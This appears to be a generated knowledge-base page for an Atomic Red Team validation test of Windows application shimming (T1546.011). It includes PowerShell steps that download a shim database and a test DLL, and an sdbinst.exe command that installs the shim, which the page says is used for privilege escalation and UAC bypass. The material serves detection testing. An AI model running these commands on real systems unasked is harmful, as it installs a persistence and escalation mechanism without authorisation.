---
atomic_guid: "9ab27e22-ee62-4211-962b-d36d9a0e6a18"
title: "Application Shim Installation"
framework: "atomic"
generated: "true"
attack_technique_id: "T1546.011"
attack_technique_name: "Event Triggered Execution: Application Shimming"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.011/T1546.011.yaml"
build_date: "2026-04-26 17:02:13"
executor: "command_prompt"
aliases:
  - "9ab27e22-ee62-4211-962b-d36d9a0e6a18"
  - "Application Shim Installation"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Application Shim Installation

Install a shim database. This technique is used for privilege escalation and bypassing user access control.
Upon execution, "Installation of AtomicShim complete." will be displayed. To verify the shim behavior, run 
the AtomicTest.exe from the <PathToAtomicsFolder>\\T1546.011\\bin directory. You should see a message box appear
with "Atomic Shim DLL Test!" as defined in the AtomicTest.dll. To better understand what is happening, review
the source code files is the <PathToAtomicsFolder>\\T1546.011\\src directory.

## Metadata

- Atomic GUID: 9ab27e22-ee62-4211-962b-d36d9a0e6a18
- Technique: T1546.011: Event Triggered Execution: Application Shimming
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1546.011/T1546.011.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1546-event_triggered_execution|T1546.011]]

## Input Arguments

### file_path

- description: Path to the shim database file
- type: string
- default: PathToAtomicsFolder\T1546.011\bin\AtomicShimx86.sdb

## Dependencies

Shim database file must exist on disk at specified location (#{file_path})

### Prerequisite Check

```powershell
if (Test-Path "#{file_path}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory (split-path "#{file_path}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicShimx86.sdb" -OutFile "#{file_path}"
```

AtomicTest.dll must exist at c:\Tools\AtomicTest.dll

### Prerequisite Check

```powershell
if (Test-Path c:\Tools\AtomicTest.dll) {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory (split-path c:\Tools\AtomicTest.dll) -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicTest.dll" -OutFile c:\Tools\AtomicTest.dll
```

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
sdbinst.exe "#{file_path}"
```

### Cleanup

```cmd
sdbinst.exe -u "#{file_path}" >nul 2>&1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.011/T1546.011.yaml)
